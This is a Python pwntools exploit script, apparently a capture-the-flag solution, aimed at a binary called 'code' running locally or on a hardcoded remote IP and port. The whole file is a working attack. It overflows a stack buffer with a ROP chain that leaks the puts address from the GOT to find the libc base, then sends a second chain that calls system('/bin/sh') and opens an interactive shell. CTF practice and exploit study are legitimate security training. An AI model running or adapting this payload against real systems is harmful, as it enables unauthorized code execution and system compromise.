#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
from sys import argv
# context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']
elf = ELF('./code')

if argv[1] == 'l':
    io = process('./code')
    # gdb.attach(io, 'b * 0x400843')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    one_gadget = 0x4239e
else:
    io = remote('58.20.46.151', 38204)
    libc = ELF('./libc.so.6')
    one_gadget = 0x45216

pop_rdi = 0x400983
io.sendlineafter('name:\n', 'wyBTs')
io.recvuntil('save\n')

# leak the address of read
payload = 'a'*0x78
payload += p64(pop_rdi) + p64(elf.got['puts'])
payload += p64(0x400570) + p64(0x4005C0)
io.sendline(payload)

io.recvuntil('ccess\n')
puts_addr = u64(io.recvuntil('\n',drop = True).ljust(8, '\x00'))
success('puts addr -> {:#x}'.format(puts_addr))
libc_base = puts_addr - libc.sym['puts']
one_gadget = one_gadget + libc_base

success('libc base -> {:#x}'.format(libc_base))
io.sendlineafter('name:\n', 'wyBTs')
io.recvuntil('save\n')
# getshell

sys = libc_base + libc.sym['system']
binsh = libc_base + libc.search('/bin/sh').next()
payload = 'a'* 0x78
payload += p64(pop_rdi) + p64(binsh)
payload += p64(sys) + p64(0x4005c0)
io.sendline(payload)
io.interactive()
io.close()
